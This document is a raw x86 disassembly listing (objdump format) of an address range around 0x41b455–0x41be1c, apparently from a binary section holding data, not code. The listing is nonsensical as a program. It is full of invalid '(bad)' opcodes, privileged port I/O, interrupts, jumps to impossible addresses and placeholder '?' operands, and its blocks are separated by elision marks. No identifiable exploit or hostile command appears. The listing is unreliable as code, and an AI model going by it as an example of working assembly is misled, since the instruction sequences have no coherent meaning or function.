  41b455:	add    BYTE PTR [eax+0xd],cl
  41b458:	sbb    eax,0xfebb5dab
  41b45d:	out    dx,eax
  41b45e:	xchg   ebp,eax
  41b45f:	iret   
  41b460:	push   ebx
  41b461:	aas    
  41b462:	sbb    esi,DWORD PTR [edx+eiz*8+0x39]
  41b466:	addr16 and eax,0x1000001
  41b46c:	add    BYTE PTR [eax],al
  41b46e:	cmp    eax,0x4ab31b64
  41b473:	sub    bl,cl
  41b475:	mov    ebx,0x3401d47a
  41b47a:	jecxz  0x41b4e6
  41b47c:	cli    
  41b47d:	ss mov al,cs:0xa708d65d
  41b484:	shl    BYTE PTR [ebp-0x78],cl
  41b487:	sbb    eax,0xf92811cc
  41b48c:	push   eax
  41b48d:	aam    0x63
  41b48f:	mov    bl,0xb1
  41b491:	xchg   DWORD PTR [ebx-0xc],edx
  41b494:	pop    edx
  41b495:	mov    ah,0xcb
  41b497:	sbb    ch,ah
  41b499:	(bad)  
  41b49a:	in     eax,0x75
  41b49c:	aas    
  41b49d:	mov    esp,0x833f6f55
  41b4a2:	int3   
  41b4a3:	out    dx,eax
  41b4a4:	int3   
  41b4a5:	cwde   
  41b4a6:	gs scas al,BYTE PTR es:[edi]
  41b4a8:	fwait
  41b4a9:	lds    esi,FWORD PTR [eax+0x3d9591a]
  41b4af:	loopne 0x41b485
  41b4b1:	scas   al,BYTE PTR es:[edi]
  41b4b2:	xchg   esi,eax
  41b4b3:	cwde   
  41b4b4:	fiadd  DWORD PTR [ecx-0x31]
  41b4b7:	sub    ecx,eax
  41b4b9:	out    dx,al
  41b4ba:	add    al,0x49
  41b4bc:	inc    edi
  41b4bd:	mov    al,ds:0x3aa7af2b
  41b4c2:	pop    es
  41b4c3:	xchg   edi,eax
  41b4c4:	cmp    BYTE PTR [edx*4+0x4ca7d3b],bl
  41b4cb:	iret   
  41b4cc:	jmp    0x41b547
  41b4ce:	scas   al,BYTE PTR es:[edi]
  41b4cf:	sbb    al,0x8f
  41b4d1:	mov    al,BYTE PTR [eax+0x519fb266]
  41b4d7:	int    0x39
  41b4d9:	mov    edx,0xb163fd09
  41b4de:	rcl    BYTE PTR [ebp-0x73],0xb5
  41b4e2:	mov    esp,0xfe3dbf81
  41b4e7:	jmp    0xf9ccb47a
  41b4ec:	(bad)  
  41b4ed:	sbb    al,0x64
  41b4ef:	repnz cwde 
  41b4f1:	js     0x41b4e1
  41b4f3:	cmp    al,bh
  41b4f5:	push   ds
  41b4f6:	jns    0x41b545
  41b4f8:	les    edi,FWORD PTR [esi-0x69]
  41b4fb:	inc    eax
  41b4fc:	cmp    BYTE PTR [esi],cl
  41b4fe:	jl     0x41b4e7
  41b500:	push   eax
  41b501:	inc    esi
  41b502:	lds    edx,FWORD PTR [eax+ebp*4]
  41b505:	and    esi,eax
  41b507:	loopne 0x41b4b3
  41b509:	jns    0x41b4b9
  41b50b:	out    0xf7,al
  41b50d:	lods   al,BYTE PTR ds:[esi]
  41b50e:	repz (bad) 
  41b510:	fisub  DWORD PTR [edx+0x1d9bca37]
  41b516:	sahf   
  41b517:	enter  0x9fe4,0x53
  41b51b:	cld    
  41b51c:	pop    ds
  41b51d:	dec    edx
  41b51e:	or     BYTE PTR [esi-0x42],dl
  41b521:	jno    0x41b592
  41b523:	adc    BYTE PTR [edi-0x23],0x3f
  41b527:	jg     0x41b55a
  41b529:	leave  
  41b52a:	jb     0x41b559
  41b52c:	jmp    0x41b576
  41b52e:	loope  0x41b4f3
  41b530:	pop    eax
  41b531:	jg     0x41b50a
  41b533:	push   ebx
  41b534:	mov    esp,0x91e061a2
  41b539:	jmp    FWORD PTR [ecx-0x42]
  41b53c:	add    ecx,esp
  41b53e:	sub    ebp,DWORD PTR [eax-0x6168450e]
  41b544:	frstor [ebx-0x44]
  41b547:	adc    dh,ch
  41b549:	into   
  41b54a:	call   0xea1d95c9
  41b54f:	and    eax,0x937ab439
  41b554:	mov    BYTE PTR [ebx],dl
  41b556:	bound  eax,QWORD PTR [eax-0x530950f0]
  41b55c:	js     0x41b5b2
  41b55e:	and    ah,BYTE PTR [ecx-0x239856b3]
  41b564:	enter  0xc0cf,0x78
  41b568:	into   
  41b569:	les    ebx,FWORD PTR [edi+0xdba249]
	...
  41b5d3:	add    BYTE PTR [eax],al
  41b5d5:	add    ah,dl
  41b5d7:	in     al,dx
  41b5d8:	add    edi,edi
  41b5da:	cmp    edi,edi
  41b5dc:	(bad)  
  41b5dd:	out    dx,eax
  41b5de:	loope  0x41b5a6
  41b5e0:	jns    0x41b5c3
  41b5e2:	dec    edi
  41b5e3:	scas   eax,DWORD PTR es:[edi]
  41b5e4:	lods   al,BYTE PTR ds:[esi]
  41b5e5:	(bad)  
  41b5e6:	add    DWORD PTR es:[bx+si],eax
  41b5ea:	add    BYTE PTR [ecx],al
  41b5ec:	add    BYTE PTR [eax],al
  41b5ee:	pop    edi
  41b5ef:	retf   
  41b5f0:	xor    BYTE PTR [edi+0x10],0x6a
  41b5f4:	repz dec esi
  41b5f6:	pop    ecx
  41b5f7:	test   al,0x4d
  41b5f9:	dec    eax
  41b5fa:	xor    DWORD PTR [esp+edi*4+0x9],ecx
  41b5fe:	les    eax,FWORD PTR [ecx]
  41b600:	jmp    0xc08ad41c
  41b605:	jecxz  0x41b665
  41b607:	ret    0xb57d
  41b60a:	sub    al,0x33
  41b60c:	retf   0x1b70
  41b60f:	mov    cl,0x1e
  41b611:	(bad)  
  41b612:	icebp  
  41b613:	ins    DWORD PTR es:[edi],dx
  41b614:	mov    ebx,0x61522685
  41b619:	retf   0xaccf
  41b61c:	dec    edx
  41b61d:	push   edi
  41b61e:	xor    eax,DWORD PTR [ebx+0x5e00f350]
  41b624:	int    0x49
  41b626:	ins    DWORD PTR es:[edi],dx
  41b627:	cld    
  41b628:	mov    es,WORD PTR [esi+0x69cbbe32]
  41b62e:	scas   al,BYTE PTR es:[edi]
  41b62f:	lea    edx,[edi+ebp*4]
  41b632:	fadd   QWORD PTR ds:0x4b261fed
  41b638:	lea    ecx,[esi]
  41b63a:	daa    
  41b63b:	sub    esi,DWORD PTR [ebx+0x56]
  41b63e:	cwde   
  41b63f:	(bad)  
  41b640:	(bad)  
  41b641:	push   0xcdc5554f
  41b646:	sub    ebp,DWORD PTR [edx]
  41b648:	pop    ss
  41b649:	add    eax,0x424bc6f2
  41b64e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b64f:	mov    esp,?
  41b651:	add    BYTE PTR [ecx-0x6c],al
  41b654:	je     0x41b5e2
  41b656:	or     DWORD PTR [ebp+0x12fed689],0xffffffa1
  41b65d:	fs mov dl,0xfd
  41b660:	mov    al,0x23
  41b662:	ret    0xecb7
  41b665:	push   esp
  41b666:	cmp    dl,BYTE PTR [ebp+0x253d6e33]
  41b66c:	in     eax,0x8d
  41b66e:	adc    eax,edi
  41b670:	dec    ecx
  41b671:	mov    al,ds:0xd6e3b3e1
  41b676:	xor    al,0x27
  41b678:	repnz mov ah,0x9b
  41b67b:	scas   eax,DWORD PTR es:[edi]
  41b67c:	push   eax
  41b67d:	push   0xb2a2f9c5
  41b682:	nop
  41b683:	fst    DWORD PTR [esi+ebp*2]
  41b686:	and    al,0x1c
  41b688:	scas   eax,DWORD PTR es:[edi]
  41b689:	addr16 retf 0x43fa
  41b68d:	lds    ebx,FWORD PTR [ecx+0x57]
  41b690:	leave  
  41b691:	fild   DWORD PTR ds:0x2e6e75ef
  41b697:	fstp   DWORD PTR [edi+ebp*4]
  41b69a:	pop    edi
  41b69b:	out    dx,al
  41b69c:	clc    
  41b69d:	push   ds
  41b69e:	and    BYTE PTR [eax+0x6bad645a],dl
  41b6a4:	retf   
  41b6a5:	xchg   esp,eax
  41b6a6:	jnp    0x41b66b
  41b6a8:	div    BYTE PTR [ebx]
  41b6aa:	jl     0x41b6f1
  41b6ac:	push   edi
  41b6ad:	scas   al,BYTE PTR es:[edi]
  41b6ae:	fwait
  41b6af:	add    DWORD PTR [eax-0x23eac9bd],eax
  41b6b5:	outs   dx,BYTE PTR ds:[esi]
  41b6b6:	cdq    
  41b6b7:	adc    eax,0x1af7e0c1
  41b6bc:	push   esi
  41b6bd:	jno    0x41b6b0
  41b6bf:	ins    BYTE PTR es:[edi],dx
  41b6c0:	scas   al,BYTE PTR es:[edi]
  41b6c1:	add    BYTE PTR [ebx-0x6cf7c363],bl
  41b6c7:	aas    
  41b6c8:	(bad)  
  41b6c9:	test   eax,0x50eb54e3
  41b6ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b6cf:	repz rcr esi,1
  41b6d2:	icebp  
  41b6d3:	mov    bl,0xa6
  41b6d5:	dec    ebx
  41b6d6:	dec    BYTE PTR [eax+0x478dd8ce]
  41b6dc:	cs test al,0xfe
  41b6df:	mov    dh,BYTE PTR [esi]
  41b6e1:	add    ah,BYTE PTR [esi]
  41b6e3:	dec    esp
  41b6e4:	mov    al,0x99
  41b6e6:	xor    al,BYTE PTR [edx-0x9adff51]
  41b6ec:	nop
  41b6ed:	pop    es
	...
  41b756:	test   al,0x63
  41b758:	sbb    edx,DWORD PTR [esi+0x7fadfedb]
  41b75e:	sti    
  41b75f:	push   ds
  41b760:	mov    ah,dh
  41b762:	cmp    BYTE PTR [ecx],bh
  41b764:	imul   ecx,DWORD PTR [edi+0x67],0x27
  41b768:	add    DWORD PTR [eax],eax
  41b76a:	add    BYTE PTR [ecx],al
  41b76c:	add    BYTE PTR [eax],al
  41b76e:	mov    edx,0x933d6f8
  41b773:	push   es
  41b774:	or     DWORD PTR [esi+0x64],ebx
  41b777:	pop    es
  41b778:	sbb    BYTE PTR [esi],ah
  41b77a:	jg     0x41b73a
  41b77c:	mov    ecx,0xb9370def
  41b781:	jno    0x41b777
  41b783:	jmp    0x41b73a
  41b785:	arpl   WORD PTR [esi],cx
  41b787:	ror    BYTE PTR [edi+0x52],1
  41b78a:	push   0xcd8acca8
  41b78f:	mov    ecx,0x3c789617
  41b794:	jae    0x41b794
  41b796:	dec    edx
  41b797:	fwait
  41b798:	fwait
  41b799:	xchg   ebp,eax
  41b79a:	xchg   ebx,eax
  41b79b:	sbb    ah,BYTE PTR [ebp+0x42]
  41b79e:	cmp    dl,BYTE PTR [esi+0x29]
  41b7a1:	push   eax
  41b7a2:	add    DWORD PTR [eax+ecx*8-0x4e0c899e],0x69
  41b7aa:	sub    DWORD PTR [eax-0x13],eax
  41b7ad:	in     al,0x17
  41b7af:	sbb    ebp,DWORD PTR ds:[eax-0x5d13ffa8]
  41b7b6:	popa   
  41b7b7:	pop    esp
  41b7b8:	cmp    al,0x1a
  41b7ba:	xor    DWORD PTR [eax+0x6adbbbae],ebx
  41b7c0:	inc    esp
  41b7c1:	xor    al,0x22
  41b7c3:	mov    ecx,0x152d0798
  41b7c8:	dec    ebp
  41b7c9:	pop    edx
  41b7ca:	sbb    al,0xad
  41b7cc:	adc    DWORD PTR [edx+ebp*4+0x2d994c09],ebp
  41b7d3:	jl     0x41b7cc
  41b7d5:	cs call 0x8c921e29
  41b7db:	and    DWORD PTR [ebx+0x280b0cac],ebx
  41b7e1:	imul   BYTE PTR [ebx]
  41b7e3:	mov    ch,0x7c
  41b7e5:	dec    ebx
  41b7e6:	jecxz  0x41b800
  41b7e8:	dec    edx
  41b7e9:	jecxz  0x41b7c5
  41b7eb:	popf   
  41b7ec:	mov    ah,BYTE PTR [edx-0x1c9a9fa1]
  41b7f2:	sbb    ecx,ebp
  41b7f4:	pop    edx
  41b7f5:	adc    eax,0x29324a91
  41b7fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b7fb:	test   DWORD PTR [edx+eiz*8],0x52baf144
  41b802:	jnp    0x41b87c
  41b804:	mov    esi,0xa98e8575
  41b809:	push   0x31
  41b80b:	loope  0x41b7a7
  41b80d:	jp     0x41b7f1
  41b80f:	mov    esp,0x5c9e6b22
  41b814:	call   DWORD PTR [ebx]
  41b816:	enter  0x2f8d,0x4a
  41b81a:	icebp  
  41b81b:	cmp    eax,0x716a5f24
  41b820:	add    esp,DWORD PTR ds:0xb291dbaa
  41b826:	add    al,0x62
  41b828:	loope  0x41b8a9
  41b82a:	pop    edi
  41b82b:	dec    ecx
  41b82c:	enter  0xdf50,0xb4
  41b830:	push   ecx
  41b831:	dec    edx
  41b832:	sbb    eax,0x5b73aee
  41b837:	out    0x7e,al
  41b839:	push   DWORD PTR [ebp-0x2283efc4]
  41b83f:	push   ss
  41b840:	jo     0x41b894
  41b842:	adc    al,BYTE PTR [edx-0x25]
  41b845:	div    ecx
  41b847:	sahf   
  41b848:	jp     0x41b855
  41b84a:	hlt    
  41b84b:	and    BYTE PTR [ecx],0xca
  41b84e:	push   0x56
  41b850:	cmp    edi,esp
  41b852:	iret   
  41b853:	sbb    eax,edi
  41b855:	ret    
  41b856:	adc    DWORD PTR [esi],esp
  41b858:	push   ds
  41b859:	mov    WORD PTR [edx+edi*2],?
  41b85c:	bound  ebx,QWORD PTR [edi-0x5]
  41b85f:	mov    cl,BYTE PTR [edx-0x70]
  41b862:	add    al,0x29
  41b864:	or     al,0x93
  41b866:	or     BYTE PTR [esi+0x1a],cl
  41b869:	outs   dx,BYTE PTR ds:[esi]
  41b86a:	inc    ebp
  41b86b:	add    DWORD PTR [esi+eax*2+0x0],edi
	...
  41b8d3:	add    BYTE PTR [eax],al
  41b8d5:	add    BYTE PTR [edx-0x8b13804],cl
  41b8db:	jg     0x41b868
  41b8dd:	cld    
  41b8de:	ret    0x78e3
  41b8e1:	add    al,0x37
  41b8e3:	rcl    edx,1
  41b8e5:	stc    
  41b8e6:	sub    BYTE PTR [bx+di],al
  41b8e9:	add    BYTE PTR [eax],al
  41b8eb:	add    DWORD PTR [eax],eax
  41b8ed:	add    BYTE PTR [ebx+esi*1+0x5bdcaeaa],dl
  41b8f4:	mov    esp,0x9082dce7
  41b8f9:	fcomp  QWORD PTR ds:0x4e34c51
  41b8ff:	std    
  41b900:	ss dec esi
  41b902:	scas   eax,DWORD PTR es:[edi]
  41b903:	inc    eax
  41b904:	pop    esi
  41b905:	xor    eax,0x8650c24b
  41b90a:	ret    0x457
  41b90d:	out    0x28,al
  41b90f:	fs mov esi,0xf965c4e
  41b915:	dec    eax
  41b916:	mov    cl,0x64
  41b918:	mov    esi,0x738445e9
  41b91d:	mov    dl,0x62
  41b91f:	icebp  
  41b920:	sbb    DWORD PTR [edi],ecx
  41b922:	fwait
  41b923:	aas    
  41b924:	mov    ds:0xeae6edb9,al
  41b929:	mov    al,ds:0x22088313
  41b92e:	inc    eax
  41b92f:	lods   al,BYTE PTR ds:[esi]
  41b930:	xor    bh,bh
  41b932:	shl    DWORD PTR [edi+ebx*1+0x6f],1
  41b936:	adc    DWORD PTR [edx+0x4],0xaa549777
  41b93d:	push   ss
  41b93e:	ja     0x41b99c
  41b940:	xchg   esi,eax
  41b941:	imul   DWORD PTR [ebx]
  41b943:	and    edx,DWORD PTR [edi-0x51c13c8e]
  41b949:	fmul   QWORD PTR [edx+0x3b]
  41b94c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b94d:	cmp    bl,ah
  41b94f:	repz adc eax,0xbf0f147b
  41b955:	adc    al,0x96
  41b957:	in     al,0x16
  41b959:	inc    ebp
  41b95a:	xchg   DWORD PTR [ecx+edi*8-0x4dfe6b9e],ecx
  41b961:	js     0x41b930
  41b963:	cmc    
  41b964:	jl     0x41b9e1
  41b966:	jns    0x41b9b5
  41b968:	add    al,0x5c
  41b96a:	or     BYTE PTR [ecx],ah
  41b96c:	ror    esp,cl
  41b96e:	lahf   
  41b96f:	(bad)  
  41b970:	jl     0x41b922
  41b972:	dec    esp
  41b973:	mov    DWORD PTR [edi],edi
  41b975:	dec    esp
  41b976:	aaa    
  41b977:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b978:	data16 adc ah,BYTE PTR [edx]
  41b97b:	imul   ebx,DWORD PTR [eax+0x782b42cd],0x6649dd66
  41b985:	loop   0x41b91d
  41b987:	xor    al,0x49
  41b989:	inc    edi
  41b98a:	sbb    edi,eax
  41b98c:	fidiv  WORD PTR ds:[edi+0x70840326]
  41b993:	xor    BYTE PTR [eax-0x2d],al
  41b996:	(bad)  
  41b997:	mov    esp,0xcfcb1df0
  41b99c:	test   al,0x7e
  41b99e:	aam    0xed
  41b9a0:	and    eax,0x1c5c83d8
  41b9a5:	loope  0x41ba09
  41b9a7:	fwait
  41b9a8:	jae    0x41b941
  41b9aa:	icebp  
  41b9ab:	test   eax,0x40d1e61
  41b9b0:	ja     0x41b93c
  41b9b2:	int    0x27
  41b9b4:	ins    BYTE PTR es:[edi],dx
  41b9b5:	mov    edi,DWORD PTR [eax+0x6b]
  41b9b8:	cmp    eax,DWORD PTR [edx]
  41b9ba:	jl     0x41b9ce
  41b9bc:	push   edi
  41b9bd:	xor    al,0xc2
  41b9bf:	test   BYTE PTR [ebx+0x39e041d5],cl
  41b9c5:	jno    0x41ba41
  41b9c7:	ins    BYTE PTR es:[edi],dx
  41b9c8:	push   0xb50c5f7f
  41b9cd:	imul   ebx,DWORD PTR [esi-0x4599566],0x12
  41b9d4:	cli    
  41b9d5:	pop    ds
  41b9d6:	push   ebp
  41b9d7:	pop    ecx
  41b9d8:	inc    eax
  41b9d9:	inc    edi
  41b9da:	out    dx,eax
  41b9db:	mov    eax,ds:0x48d8da96
  41b9e0:	sub    bh,dh
  41b9e2:	cmp    BYTE PTR [edi+eiz*4+0x15140705],dh
  41b9e9:	mov    esp,DWORD PTR [edx+0x7d]
  41b9ec:	sbb    al,0xec
	...
  41ba56:	ret    
  41ba57:	mov    esp,0xf87f4844
  41ba5c:	iret   
  41ba5d:	mov    edi,0x8c8b3b8c
  41ba62:	mov    WORD PTR [ebx+0x39],?
  41ba65:	inc    edx
  41ba66:	sub    DWORD PTR [bx+di],eax
  41ba69:	add    BYTE PTR [eax],al
  41ba6b:	add    DWORD PTR [eax],eax
  41ba6d:	add    BYTE PTR [ebx-0x5dd0f0c7],ah
  41ba73:	adc    eax,DWORD PTR gs:[edi+0x33]
  41ba77:	loop   0x41ba7a
  41ba79:	in     eax,0xf
  41ba7b:	mov    bl,0x1c
  41ba7d:	push   ebx
  41ba7f:	fcmovu st,st(6)
  41ba81:	test   BYTE PTR [eax-0x45],ch
  41ba84:	popf   
  41ba85:	daa    
  41ba86:	inc    esi
  41ba87:	and    BYTE PTR [ecx+0x66],cl
  41ba8a:	push   ebx
  41ba8b:	retf   0x4028
  41ba8e:	les    ecx,FWORD PTR [esp+eax*1]
  41ba91:	sbb    DWORD PTR [edi+0x8],edx
  41ba94:	lea    ecx,[ecx-0x49089331]
  41ba9a:	call   0x7abe:0x6c3475b5
  41baa1:	mov    ds:0xf027993c,al
  41baa6:	mov    bh,0xae
  41baa8:	add    BYTE PTR [esi],bl
  41baaa:	rol    bl,0x94
  41baad:	es push ecx
  41baaf:	push   0x34f685e6
  41bab4:	outs   dx,DWORD PTR ds:[esi]
  41bab5:	jo     0x41bafa
  41bab7:	pop    eax
  41bab8:	cmp    ebx,0x4b7d1e15
  41babe:	mul    DWORD PTR [esi]
  41bac0:	outs   dx,BYTE PTR ds:[esi]
  41bac1:	cmp    dl,BYTE PTR ds:0x66587f74
  41bac7:	int3   
  41bac8:	arpl   WORD PTR [esi],si
  41baca:	dec    esi
  41bacb:	sar    DWORD PTR [ecx-0x336864ca],0x8e
  41bad2:	jns    0x41bb1b
  41bad4:	sbb    DWORD PTR [edi-0x47ae636b],0xffffffca
  41badb:	mov    ds,ebx
  41badd:	xlat   BYTE PTR ds:[ebx]
  41bade:	loope  0x41baec
  41bae0:	push   ds
  41bae1:	mov    ds:0x5978f9dd,al
  41bae6:	inc    ebp
  41bae7:	loopne 0x41baba
  41bae9:	ins    DWORD PTR es:[edi],dx
  41baea:	push   edx
  41baeb:	xor    eax,0xa295ad04
  41baf0:	dec    edi
  41baf1:	repnz push DWORD PTR [eax+0x5c]
  41baf5:	stos   DWORD PTR es:[edi],eax
  41baf6:	mov    eax,0x2d7691b5
  41bafb:	lahf   
  41bafc:	ja     0x41ba82
  41bafe:	mov    ch,0x9
  41bb00:	and    eax,0x38042cac
  41bb05:	shr    DWORD PTR [edi-0x6a],1
  41bb08:	call   0xc86d7d68
  41bb0d:	into   
  41bb0e:	dec    edi
  41bb0f:	in     al,0xba
  41bb11:	mov    DWORD PTR [ebp-0x28e10623],ecx
  41bb17:	enter  0x6b96,0x26
  41bb1b:	inc    cx
  41bb1d:	sbb    bl,al
  41bb1f:	and    eax,0xd8cfe1dc
  41bb24:	push   es
  41bb25:	mov    esp,0x171abf33
  41bb2a:	inc    edi
  41bb2b:	jne    0x41baed
  41bb2d:	test   DWORD PTR [eax],0x3875d935
  41bb33:	dec    edx
  41bb34:	aas    
  41bb35:	mov    al,BYTE PTR [ebx+eiz*8]
  41bb38:	mov    eax,0x80718cf0
  41bb3d:	fmulp  st(5),st
  41bb3f:	test   edx,esp
  41bb41:	retf   0xe6df
  41bb44:	repnz inc ebx
  41bb46:	mov    esi,0x52468698
  41bb4b:	arpl   WORD PTR [ebx],dx
  41bb4d:	add    DWORD PTR [edx+0x7],esp
  41bb50:	test   al,0x30
  41bb52:	xor    dl,dl
  41bb54:	hlt    
  41bb55:	xchg   esp,eax
  41bb56:	dec    edx
  41bb57:	shl    BYTE PTR [ebx+eiz*4],1
  41bb5a:	mov    esp,0xa3d162fc
  41bb5f:	jbe    0x41bb8a
  41bb61:	and    eax,0x85f3927e
  41bb66:	jl     0x41bbbf
  41bb68:	iret   
  41bb69:	test   al,0xf2
  41bb6b:	(bad)  
  41bb6c:	push   esi
  41bb6d:	add    BYTE PTR gs:[eax],al
	...
  41bbd4:	add    BYTE PTR [eax],al
  41bbd6:	or     bh,BYTE PTR [eax-0x4048555b]
  41bbdc:	(bad)  
  41bbde:	jg     0x41bbe5
  41bbe0:	arpl   WORD PTR [edi-0x20],cx
  41bbe3:	jmp    0x41bb96
  41bbe5:	das    
  41bbe6:	sub    al,BYTE PTR [bx+di]
  41bbe9:	add    BYTE PTR [eax],al
  41bbeb:	add    DWORD PTR [eax],eax
  41bbed:	add    BYTE PTR [esi+0x74],ah
  41bbf0:	cmp    al,0x19
  41bbf2:	dec    edi
  41bbf3:	cmp    eax,0x847d263a
  41bbf8:	xor    DWORD PTR [ecx],0xc7ccf87b
  41bbfe:	inc    ecx
  41bbff:	mov    al,ds:0x9f4793e
  41bc04:	push   ss
  41bc05:	pop    edx
  41bc06:	cmp    ebx,DWORD PTR [ecx]
  41bc08:	loop   0x41bbf9
  41bc0a:	add    dl,BYTE PTR es:[edx]
  41bc0d:	mov    al,ds:0x2c3cc885
  41bc12:	call   0x524fe6be
  41bc17:	ja     0x41bc5f
  41bc19:	call   FWORD PTR [eax]
  41bc1b:	add    ebx,DWORD PTR [edx]
  41bc1d:	mov    bl,0x91
  41bc1f:	mov    edx,eax
  41bc21:	shl    BYTE PTR [esp+ebx*1-0x60],cl
  41bc25:	add    BYTE PTR [eax+0x64d7de44],dl
  41bc2b:	pop    eax
  41bc2c:	mov    ah,0xd7
  41bc2e:	jmp    ecx
  41bc30:	pop    esp
  41bc31:	fisubr WORD PTR [edx+0x7c2e700d]
  41bc37:	in     eax,dx
  41bc38:	mov    eax,ds:0x9fe173ef
  41bc3d:	push   ecx
  41bc3e:	fwait
  41bc3f:	xchg   edi,eax
  41bc40:	outs   dx,DWORD PTR ds:[esi]
  41bc41:	xchg   edx,eax
  41bc42:	test   DWORD PTR [esi-0x530b9a39],0x1f5c6456
  41bc4c:	aad    0x9f
  41bc4e:	(bad)  
  41bc4f:	mov    ds:0x9d308027,eax
  41bc54:	jmp    0x41bcce
  41bc56:	lock push 0x82af1f78
  41bc5c:	jmp    0x9d91f86f
  41bc61:	cdq    
  41bc62:	imul   eax,eax,0xfffffff6
  41bc65:	pop    ss
  41bc66:	dec    esp
  41bc67:	int3   
  41bc68:	and    dl,BYTE PTR [bp+si]
  41bc6b:	int    0xc9
  41bc6d:	lea    edx,[ebp-0x27]
  41bc70:	mov    ch,0x76
  41bc72:	add    esi,DWORD PTR [eax]
  41bc74:	jae    0x41bcb3
  41bc76:	or     esi,DWORD PTR [ebp+ebx*8+0x54a0e35d]
  41bc7d:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  41bc7f:	sahf   
  41bc80:	lods   eax,DWORD PTR ds:[esi]
  41bc81:	sbb    eax,0x9f830fe8
  41bc86:	cmp    ah,BYTE PTR [ebx-0x70e791df]
  41bc8c:	iret   
  41bc8d:	popf   
  41bc8e:	add    bl,BYTE PTR [eax-0x57]
  41bc91:	fcomp  st(0)
  41bc93:	jle    0x41bc6c
  41bc95:	bound  esi,QWORD PTR [ebx+0x15ddda96]
  41bc9b:	and    al,0xcb
  41bc9d:	add    ah,dl
  41bc9f:	sar    BYTE PTR [edx],1
  41bca1:	mov    bl,0xfd
  41bca3:	xlat   BYTE PTR ds:[ebx]
  41bca4:	push   es
  41bca5:	sahf   
  41bca6:	cwde   
  41bca7:	inc    ebp
  41bca8:	ret    
  41bca9:	clc    
  41bcaa:	jge    0x41bc44
  41bcac:	(bad)  
  41bcad:	hlt    
  41bcae:	pop    ebp
  41bcaf:	and    dl,BYTE PTR gs:[eax+edx*1]
  41bcb3:	push   esi
  41bcb4:	aad    0xbb
  41bcb6:	add    al,bh
  41bcb8:	jge    0x41bcfc
  41bcba:	(bad)  
  41bcbb:	(bad)  
  41bcbc:	outs   dx,BYTE PTR ds:[esi]
  41bcbd:	or     BYTE PTR [ecx+0x50e256f3],bl
  41bcc3:	or     eax,0x8377566c
  41bcc8:	ins    BYTE PTR es:[edi],dx
  41bcc9:	xchg   esp,eax
  41bcca:	jno    0x41bd42
  41bccc:	sub    eax,0x1b8a34fc
  41bcd1:	pushf  
  41bcd2:	daa    
  41bcd3:	mov    ebx,0x312630a9
  41bcd8:	push   ds
  41bcd9:	jae    0x41bd55
  41bcdb:	enter  0xad44,0xf2
  41bcdf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bce0:	pop    es
  41bce1:	jge    0x41bcf5
  41bce3:	stc    
  41bce4:	ret    
  41bce5:	ss jmp 0x41bc6d
  41bce8:	aaa    
  41bce9:	out    0x42,al
  41bceb:	mov    edi,esi
  41bced:	mov    es,WORD PTR [eax]
	...
  41bd53:	add    BYTE PTR [eax],al
  41bd55:	add    dl,dl
  41bd57:	xor    bh,dl
  41bd59:	clc    
  41bd5a:	cli    
  41bd5b:	clc    
  41bd5c:	sar    BYTE PTR [edx],cl
  41bd5e:	sti    
  41bd5f:	mov    ebp,0xd6fed9d8
  41bd64:	das    
  41bd65:	pop    ebp
  41bd66:	sub    eax,DWORD PTR [bx+di]
  41bd69:	add    BYTE PTR [eax],al
  41bd6b:	add    DWORD PTR [eax],eax
  41bd6d:	add    BYTE PTR [ebx],cl
  41bd6f:	mov    ecx,eax
  41bd71:	test   DWORD PTR [ecx+ecx*2],eax
  41bd74:	dec    edi
  41bd75:	xchg   esi,eax
  41bd76:	mov    WORD PTR [edx-0x4c],ds
  41bd79:	shr    DWORD PTR [eax+0x18],0x79
  41bd7d:	test   eax,0x69341678
  41bd82:	xchg   ebx,eax
  41bd83:	dec    esi
  41bd84:	inc    ebx
  41bd85:	dec    ebx
  41bd86:	arpl   dx,si
  41bd88:	or     esp,eax
  41bd8a:	stc    
  41bd8b:	jno    0x41bd1a
  41bd8d:	(bad)  
  41bd8e:	jp     0x41bda3
  41bd90:	int3   
  41bd91:	shr    DWORD PTR [eax+0x21816abe],1
  41bd97:	dec    esp
  41bd98:	mov    ds:0x750cad68,eax
  41bd9d:	push   esp
  41bd9e:	ins    DWORD PTR es:[edi],dx
  41bd9f:	es push cs
  41bda1:	sbb    al,0x61
  41bda3:	mul    BYTE PTR [eax]
  41bda5:	int    0x2b
  41bda7:	div    BYTE PTR [edi+0x72ce9181]
  41bdad:	pop    edi
  41bdae:	outs   dx,BYTE PTR ds:[esi]
  41bdaf:	mov    bh,BYTE PTR [edx]
  41bdb1:	dec    edx
  41bdb2:	cmp    al,BYTE PTR [esi+eax*1-0x79]
  41bdb6:	mov    eax,ds:0x62e4ee8b
  41bdbb:	js     0x41bd98
  41bdbd:	call   0xbab4e1a
  41bdc2:	popa   
  41bdc3:	inc    ecx
  41bdc4:	xor    DWORD PTR [eax+0x77],esi
  41bdc7:	mov    al,ds:0x77288b9a
  41bdcc:	lods   eax,DWORD PTR ds:[esi]
  41bdcd:	or     dl,al
  41bdcf:	and    eax,0xdc5e6486
  41bdd4:	inc    esp
  41bdd5:	in     eax,dx
  41bdd6:	or     bl,BYTE PTR ds:0xfc100872
  41bddc:	xchg   esi,eax
  41bddd:	pop    ebp
  41bdde:	retf   0xe2da
  41bde1:	and    esi,DWORD PTR [edi+0x47e2ffc2]
  41bde7:	test   al,0x59
  41bde9:	cmp    DWORD PTR [esi+0x4d],eax
  41bdec:	aaa    
  41bded:	and    ch,BYTE PTR [esi-0x1]
  41bdf0:	xlat   BYTE PTR ds:[ebx]
  41bdf1:	test   cl,dh
  41bdf3:	loopne 0x41be19
  41bdf5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bdf6:	push   0x8cfa8df3
  41bdfb:	maxps  xmm5,XMMWORD PTR [edi+ebp*1+0x3147e0b6]
  41be03:	pop    esi
  41be04:	sub    DWORD PTR [ebx-0xb],edx
  41be07:	cmp    eax,0x71e6c474
  41be0c:	adc    eax,DWORD PTR [esi*1+0x7d52439]
  41be13:	cmp    al,0x67
  41be15:	cmp    edx,DWORD PTR [ecx-0x72]
  41be18:	and    bh,bh
  41be1a:	xchg   ebx,eax
  41be1b:	dec    esi
  41be1c:	fwait
